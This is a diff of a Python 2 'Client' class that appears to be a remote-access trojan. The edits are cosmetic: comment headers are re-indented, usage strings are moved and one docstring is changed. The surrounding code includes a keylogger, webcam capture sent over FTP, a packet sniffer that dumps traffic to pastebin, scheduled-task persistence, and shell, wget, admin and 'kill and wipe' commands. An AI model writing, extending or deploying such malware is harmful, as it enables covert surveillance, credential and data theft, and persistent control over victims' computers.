@@ -558,7 +558,7 @@ class Client(object):
             if self.__v__:
                 print "Error: '{}'".format(str(e))
 
-# ------------------- keylogger -------------------------
+    # ------------------- keylogger -------------------------
 
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.options['window']:
@@ -605,7 +605,7 @@ class Client(object):
                 else:
                     time.sleep(0.1)
                     
-# ------------------- webcam -------------------------
+    # ------------------- webcam -------------------------
 
     def _webcam_image(self):
         dev = VideoCapture(0)
@@ -631,7 +631,7 @@ class Client(object):
         result = self._ftp(fpath)
         return result
 
-# ------------------- packetsniff -------------------------
+    # ------------------- packetsniff -------------------------
 
     def _packetsniff_udp_header(self, data):
         try:
@@ -772,7 +772,7 @@ class Client(object):
         self.packetsniff.options['buffer'] = []
         return result
 
-# ------------------- persistence -------------------------
+    # ------------------- persistence -------------------------
 
     def _persistence_add_scheduled_task(self):
         if self.__f__:
@@ -933,7 +933,36 @@ class Client(object):
         except: pass
         return False
 
-# ------------------ commands --------------------------
+    # ------------------ commands --------------------------
+
+    pwd.usage           = 'pwd'
+    run.usage           = 'run'
+    kill.usage          = 'kill'
+    info.usage          = 'info'
+    jobs.usage          = 'jobs'
+    admin.usage         = 'admin'
+    start.usage         = 'start'
+    shell.usage         = 'shell'
+    webcam.usage        = 'webcam'
+    status.usage        = 'status'
+    options.usage       = 'options'
+    results.usage       = 'results'
+    standby.usage       = 'standby'
+    modules.usage       = 'modules'
+    commands.usage      = 'commands'
+    keylogger.usage     = 'keylogger'
+    screenshot.usage    = 'screenshot'
+    persistence.usage   = 'persistence'
+    packetsniff.usage   = 'packetsniff'
+    cd.usage            = 'cd <path>'
+    new.usage           = 'new <url>'
+    set.usage           = 'set <cmd> x=y'
+    help.usage          = 'help <option>'
+    show.usage          = 'show <option>'
+    ls.usage            = 'ls <path>'
+    wget.usage          = 'wget <url>'
+    disable.usage       = 'disable <cmd>'
+    enable.usage        = 'enable <cmd>'
 
     @_command
     def cd(self, *x):
@@ -972,7 +1001,7 @@ class Client(object):
 
     @_command
     def kill(self):
-        """\tkill client"""
+        """\tkill client and wipe"""
         return self._kill()
     
     @_command
@@ -1079,35 +1108,6 @@ class Client(object):
     def packetsniff(self):
         """capture client network traffic and dump to pastebin"""
         return self._packetsniff()
-
-    pwd.usage           = 'pwd'
-    run.usage           = 'run'
-    kill.usage          = 'kill'
-    info.usage          = 'info'
-    jobs.usage          = 'jobs'
-    admin.usage         = 'admin'
-    start.usage         = 'start'
-    shell.usage         = 'shell'
-    webcam.usage        = 'webcam'
-    status.usage        = 'status'
-    options.usage       = 'options'
-    results.usage       = 'results'
-    standby.usage       = 'standby'
-    modules.usage       = 'modules'
-    commands.usage      = 'commands'
-    keylogger.usage     = 'keylogger'
-    screenshot.usage    = 'screenshot'
-    persistence.usage   = 'persistence'
-    packetsniff.usage   = 'packetsniff'
-    cd.usage            = 'cd <path>'
-    new.usage           = 'new <url>'
-    set.usage           = 'set <cmd> x=y'
-    help.usage          = 'help <option>'
-    show.usage          = 'show <option>'
-    ls.usage            = 'ls <path>'
-    wget.usage          = 'wget <url>'
-    disable.usage       = 'disable <cmd>'
-    enable.usage        = 'enable <cmd>'
 
 # -----------------   main   --------------------------
 
